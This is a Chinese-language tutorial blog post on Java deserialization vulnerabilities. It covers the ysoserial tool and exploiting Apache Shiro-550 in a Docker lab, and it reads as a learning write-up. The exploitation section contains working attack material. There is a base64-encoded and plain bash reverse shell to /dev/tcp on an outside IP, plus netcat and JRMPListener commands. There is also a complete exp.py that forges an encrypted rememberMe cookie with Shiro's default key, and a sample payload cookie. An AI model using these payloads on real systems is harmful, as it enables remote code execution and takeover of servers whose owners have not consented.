---
layout: post
title: "Java反序列化漏洞ysoserial工具使用shiro反序列化利用"
date: 2024-12-25 20:07:42 +0800
description: "文章浏览阅读9.9k次，点赞8次，Java反序列化机制Java 通过 writeObject 序列化"
keywords: "java反序列化漏洞利用工具"
categories: ['漏洞复现', 'Web', 'Ctf', '', '']
tags: ['Java']
artid: "120785519"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=120785519
    alt: "Java反序列化漏洞ysoserial工具使用shiro反序列化利用"
render_with_liquid: false
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     Java反序列化漏洞（ysoserial工具使用、shiro反序列化利用）
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-tomorrow-night" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <img src="https://i-blog.csdnimg.cn/blog_migrate/8035b53f380f563bc27ff484c7898d0e.png">
     <h4>
      <a id="Java_2">
      </a>
      Java反序列化机制
     </h4>
     <p>
      Java 通过 writeObject 序列化将对象保存为
      <strong>
       二进制数据流
      </strong>
      ，通过 readObject 反序列化将序列化后的二进制重新反序列化为 Java 对象，如果一个类 readObject 方法被重写，反序列化时调用的是重写后的 readObject 方法，Java反序列化漏洞就是从可以被恶意利用的 readObject 开始
     </p>
     <pre><code class="prism language-java"><span class="token class-name">FileInputStream</span> fileIn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">'1.bin'</span><span class="token punctuation">)</span>
<span class="token class-name">ObjectInputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileIn<span class="token punctuation">)</span>    
e <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Employee</span><span class="token punctuation">)</span> in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
     <h4>
      <a id="_12">
      </a>
      漏洞原理
     </h4>
     <p>
      以一个简单的 demo 为例
     </p>
     <pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> demo1<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{<!-- --></span>
        <span class="token comment">//定义myObj对象</span>
        <span class="token class-name">MyObject</span> myObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        myObj<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"hi"</span><span class="token punctuation">;</span>
        <span class="token comment">//创建一个包含对象进行反序列化信息的”object”数据文件</span>
        <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"object"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> os <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//writeObject()方法将myObj对象写入object文件</span>
        os<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>myObj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//从文件中反序列化obj对象</span>
        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"object"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//恢复对象</span>
        <span class="token class-name">MyObject</span> objectFromDisk <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">MyObject</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>objectFromDisk<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">MyObject</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token comment">//重写readObject()方法</span>
    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ObjectInputStream</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">{<!-- --></span>
        <span class="token comment">//执行默认的readObject()方法</span>
        in<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//执行打开计算器程序命令</span>
        <span class="token class-name">String</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> cmd<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"/C"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token comment">// windows下执行此命令，linux-&gt;open /Applications/Calculator.app/</span>
        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
     <p>
      实现 java.io.Serializable 接可才可以被反序列化，而且所有属性必须是可序列化的(用 transient 关键字修饰的属性除外, 不会参与反序列化)
     </p>
     <p>
      重写了
      <code>
       readObject()
      </code>
      函数，定制了反序列化的行为，反序列化时首先会调用 readObject，就像 PHP 反序列化时调用 __weakup
     </p>
     <p>
      <img alt="image-20211014210927339" src="https://i-blog.csdnimg.cn/blog_migrate/7348a725c9309df2fc23de2576044e2c.png"/>
     </p>
     <p>
      <img alt="image-20211014211002931" src="https://i-blog.csdnimg.cn/blog_migrate/d33f46cf836e788c318773ff4884b58c.png"/>
     </p>
     <p>
      <code>
       ac ed 00 05
      </code>
      是 java 序列化内容的特征，如果经过 base64 编码，那么相对应的是
      <code>
       rO0AB
      </code>
     </p>
     <p>
      Java拥有的丰富的第三方类库，Java 反序列化大多也是因为其类库的安全问题而产生的
     </p>
     <h4>
      <a id="_73">
      </a>
      漏洞利用
     </h4>
     <h5>
      <a id="ysoserial_75">
      </a>
      ysoserial
     </h5>
     <ul>
      <li>
       <p>
        ysoserial
       </p>
       <p>
        https://github.com/frohoff/ysoserial/
       </p>
       <p>
        一款用于生成利用不安全的Java对象反序列化的有效负载的概念验证工具
       </p>
       <pre><code>Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
</code></pre>
       <p>
        base64编码问题：因为 windows 不能在简单的命令行中使用管道符进行 base，所以推荐使用 linux，base64输出时加命令保证不自动换行
       </p>
       <pre><code class="prism language-bash">java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections5 <span class="token string">"cmd /c calc"</span> <span class="token operator">|</span>base64 -w0
<span class="token comment"># 还需要进行一次 url 编码</span>
</code></pre>
       <p>
        关于 windows 命令使用可以参考
        <a href="https://book.hacktricks.xyz/pentesting-web/deserialization#java-http" rel="nofollow">
         链接
        </a>
       </p>
      </li>
      <li>
       <p>
        http://jackson-t.ca/runtime-exec-payloads.html
       </p>
       <p>
        可以通过这个网站找到 payload 编码的命令
       </p>
       <p>
        <img alt="image-20211014222302220" src="https://i-blog.csdnimg.cn/blog_migrate/cc194758d5875359270e7eab64a4d3f8.png"/>
       </p>
      </li>
     </ul>
     <h5>
      <a id="Gadget_104">
      </a>
      Gadget
     </h5>
     <ul>
      <li>
       <p>
        CommonsCollection
       </p>
       <p>
        1-10对应cc版本
       </p>
      </li>
      <li>
       <p>
        CommonsBeanUtils
       </p>
       <p>
        shiro721中的利用
       </p>
      </li>
      <li>
       <p>
        JRMP
       </p>
       <p>
        JRMPClient
       </p>
       <p>
        JRMPListener
       </p>
      </li>
      <li>
       <p>
        URLDNS
       </p>
      </li>
      <li>
       <p>
        JNDI
       </p>
       <p>
        JNDI (Java Naming and Directory Interface) 是一个应用程序设计的 API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口。JNDI 支持的服务主要有以下几种：DNS、LDAP、 CORBA 对象服务、RMI 等
       </p>
      </li>
     </ul>
     <p>
      受此影响到的 Java 组件
     </p>
     <ul>
      <li>
       Shiro：Apache Shiro 是一个强大灵活的开源安全框架，可以完全处理身份验证、授权、加密和会话管理
      </li>
      <li>
       Weblogic：确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器
      </li>
      <li>
       Fastjson/jackson：是Java 库，可以将Java 对象转换为JSON 格式，当然它也可以将JSON 字符串转换为Java 对象
      </li>
      <li>
       Apereo Cas：CAS是一种针对Web的企业多语言单点登录解决方案，并尝试成为您的身份验证和授权需求的综合平台
      </li>
      <li>
       JDBC：JDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口，使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问
      </li>
      <li>
       XMLDecoder：用于将XMLEncoder创建的xml文档内容反序列化为一个Java对象，其位于java.beans包下
      </li>
      <li>
       Yaml：Yaml是一个可读性高、用来表达数据序列化的格式，类似于XML但比XML更简洁，在Java中，有一个用于解析YAML格式的库，即SnakeYaml，是一个完整的YAML1.1规范Processor，支持UTF-8/UTF-16，支持Java对象的序列化/反序列化，支持所有YAML定义的类型
      </li>
      <li>
       XStream：XStream是Java类库，用来将对象序列化成XML （JSON）或反序列化为对象
      </li>
      <li>
       Websphere：IBM WebSphere® Application Server Community Edition（WASCE）是一款构建于 Apache Geronimo（即 Apache Software Foundation 的开放式源代码应用程序服务器项目）上的、轻量级的 Java 2 Platform，Enterprise Edition（J2EE）应用程序服务器
      </li>
      <li>
       JBoos：是一个基于J2EE的开放源代码的应用服务器，JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用
      </li>
      <li>
       Jenkins：是一个开源的、提供友好操作界面的持续集成(CI)工具，主要用于持续、自动的构建/测试软件项目、监控外部任务的运行，Jenkins用Java语言编写，可在Tomcat等流行的servlet容器中运行，也可独立运行。通常与版本管理工具(SCM)、构建工具结合使用。常用的版本控制工具有SVN、GIT，构建工具有Maven、Ant、Gradle
      </li>
      <li>
       Dubbo：阿里巴巴公司开源的一个高性能优秀的服务框架，使得应用可通过高性能的 RPC 实现服务的输出和输入功能，可以和Spring框架无缝集成
      </li>
      <li>
       当然还有其他组件
      </li>
     </ul>
     <h4>
      <a id="Shiro_146">
      </a>
      Shiro反序列化
     </h4>
     <p>
      Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理
     </p>
     <h5>
      <a id="Shiro_150">
      </a>
      Shiro框架默认指纹特征
     </h5>
     <p>
      在请求包的Cookie中为?rememberMe字段赋任意值，收到返回包的 Set-Cookie 中存在?rememberMe=deleteMe?字段，说明目标有使用Shiro框架，可以进一步测试
     </p>
     <p>
      <img alt="image-20211015141523931" src="https://i-blog.csdnimg.cn/blog_migrate/6d298c8d0c43b8ee67379f6d58f00dcb.png"/>
     </p>
     <h5>
      <a id="shiro550_156">
      </a>
      shiro-550
     </h5>
     <p>
      <strong>
       漏洞原理
      </strong>
     </p>
     <p>
      Apache Shiro框架提供了记住我的功能（RememberMe），当接收到未经身份验证的用户请求时，会执行以下操作
     </p>
     <ol>
      <li>
       从请求数据包中提取 Cookie 中 rememberMe 字段的值
      </li>
      <li>
       对提取的 cookie 值进行 base64 解码
      </li>
      <li>
       对 base64 解码后的值进行 AES 解码
      </li>
      <li>
       对解密后的字节数组调用 ObjectInputStream.readObject() 方法来反序列化
      </li>
     </ol>
     <p>
      问题就在于
      <strong>
       Shiro 1.2.4及之前的版本
      </strong>
      中，AES加密的密钥默认硬编码在代码里，如果服务端采用的是默认的加密密钥，攻击者就可以构造一个恶意对象，执行任意代码
     </p>
     <p>
      <strong>
       漏洞利用
      </strong>
     </p>
     <p>
      环境用 docker 搭建
     </p>
     <pre><code class="prism language-bash"><span class="token comment"># 获取docker镜像</span>
docker pull medicean/vulapps:s_shiro_1
<span class="token comment"># 启动docker,注意端口是否在安全组中打开</span>
docker run -d -p <span class="token number">8080</span>:8080 medicean/vulapps:s_shiro_1
</code></pre>
     <p>
      访问IP:端口，此页面为搭建成功
     </p>
     <p>
      <img alt="image-20211015140842418" src="https://i-blog.csdnimg.cn/blog_migrate/d44e9d170f22c0aefe66dad915490601.png"/>
     </p>
     <p>
      有很多图形化的工具,如
      <a href="https://github.com/j1anFen/shiro_attack">
       link
      </a>
      ，但是为了更好的了解漏洞，分步骤进行利用
     </p>
     <p>
      <strong>
       检查是否存在默认的key
      </strong>
     </p>
     <p>
      工具：https://github.com/insightglacier/Shiro_exploit
     </p>
     <pre><code class="prism language-php">pip install pycryptodome
 python <span class="token operator">.</span>\shiro_exploit<span class="token operator">.</span>py <span class="token operator">-</span>u <span class="token argument-name">http</span><span class="token punctuation">:</span><span class="token comment">//url:port</span>
</code></pre>
     <p>
      <img alt="image-20211015142407101" src="https://i-blog.csdnimg.cn/blog_migrate/e290f63245cd84b2a8424bbfa33eb7c3.png"/>
     </p>
     <p>
      <strong>
       漏洞利用
      </strong>
     </p>
     <ol>
      <li>
       <p>
        在 vps 上监听 9999 端口
       </p>
       <pre><code class="prism language-bash"><span class="token function">nc</span> -lvvp <span class="token number">9999</span>
</code></pre>
       <p>
        用来接收反弹的shell
       </p>
      </li>
      <li>
       <p>
        通过ysoserial中JRMP监听模块，监听 6666 端口并执行反弹shell命令
       </p>
       <pre><code class="prism language-bash">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener <span class="token number">6666</span> CommonsCollections4 <span class="token string">'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuMTk2LjE3My4yNTQvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}'</span>

<span class="token comment"># 其中 base 编码通过 http://www.jackson-t.ca/runtime-exec-payloads.html 网站编码，注意此处和端口为上一步 vps 监听端口</span>
<span class="token function">bash</span> -i <span class="token operator">&gt;&amp;</span> /dev/tcp/121.196.173.254/9999 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
<span class="token function">bash</span> -c <span class="token punctuation">{<!-- --></span>echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuMTk2LjE3My4yNTQvOTk5OSAwPiYx<span class="token punctuation">}</span><span class="token operator">|</span><span class="token punctuation">{<!-- --></span>base64,-d<span class="token punctuation">}</span><span class="token operator">|</span><span class="token punctuation">{<!-- --></span>bash,-i<span class="token punctuation">}</span>
</code></pre>
      </li>
      <li>
       <p>
        使用修改后的 exp.py 脚本生成 payload
       </p>
       <pre><code class="prism language-bash">python2 .<span class="token punctuation">\</span>exp.py <span class="token number">121.196</span>.173.254:6666

<span class="token comment"># 注意 exp.py 和 ysoserial 要在同一目录，端口是 jrmp 监听端口，生成 payload</span>
<span class="token assign-left variable">rememberMe</span><span class="token operator">=</span>deeUXLJaTn+VopkZgKIWVLd7QRdd+x74oPuD6ThOle3otoxxGCfgZQe6Hc6lQZYh+n1i6MmtqB3YYX7fa6Gezwhf6IXZ8FSAR+cpbL7+mIKEpblcXnO9UQTE5VcnDJxXeYS46PgTmHl2Am+acrGLnNBPdpUcyUppXq1PvAK6NEB63kPOpgQPR0fNJGcx1lwZW/ZZh5A70bz+0BuB+VUXy0IO3CxVzsqx+4TH9vEaYEcgFoEgNpHjbLlOV7sSCXwNzjx1dUUAJ2se3Vg2yTDOCqqf0TW4l8KqbFIWIhtnngKX/kcW2Dpjay0aoqkXRs9chL1bSMaX39Uh+x97KBrqnDJAf3oCl80ItwwP3bQyqSix08d8gipHftzHATVNMRR90hhoF3S4Tfvq/xhky8Znzw<span class="token operator">==</span>
</code></pre>
       <p>
        exp.py
       </p>
       <pre><code class="prism language-python"><span class="token keyword">import</span> sys
<span class="token keyword">import</span> uuid
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> subprocess
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">def</span> <span class="token function">encode_rememberme</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>
    popen <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'java'</span><span class="token punctuation">,</span> <span class="token string">'-jar'</span><span class="token punctuation">,</span> <span class="token string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span><span class="token punctuation">,</span> <span class="token string">'JRMPClient'</span><span class="token punctuation">,</span> command<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>
    BS <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size
    pad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    key <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span><span class="token punctuation">)</span>
    iv <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">bytes</span>
    encryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
    file_body <span class="token operator">=</span> pad<span class="token punctuation">(</span>popen<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    base64_ciphertext <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>iv <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>file_body<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> base64_ciphertext

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> encode_rememberme<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   
<span class="token keyword">print</span> <span class="token string">"rememberMe={0}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
      </li>
      <li>
       <p>
        构造数据包，伪造cookie，发送Payload
       </p>
       <p>
        <img alt="image-20211015144742694" src="https://i-blog.csdnimg.cn/blog_migrate/f18e448f2e46c8bdf9ce08ebbb605885.png"/>
       </p>
       <p>
        成功反弹shell
       </p>
      </li>
     </ol>
     <p>
      不止这一种漏洞利用方式，还可以直接执行命令，还有 shiro 721漏洞，可以看这篇文章
      <a href="https://www.cnblogs.com/xiaozi/p/13239046.html" rel="nofollow">
       Link
      </a>
      ，
      <a href="https://www.freebuf.com/vuls/264079.html" rel="nofollow">
       Link2
      </a>
     </p>
     <p>
      人菜就要多学习，本次只是对Java反序列化的简单学习，继续努力
     </p>
     <h4>
      <a id="_261">
      </a>
      参考链接
     </h4>
     <p>
      https://www.vulbox.com/knowledge/detail/?id=11
     </p>
     <p>
      https://paper.seebug.org/1503/
     </p>
     <img src="https://i-blog.csdnimg.cn/blog_migrate/d717a424deb896a4ca97a7f1f83da1f8.png">
     </img>
    </img>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="68747470733a2f:2f626c6f672e6373646e2e6e65742f7132303031303631392f:61727469636c652f64657461696c732f313230373835353139" class_="artid" style="display:none">
 </p>
</div>


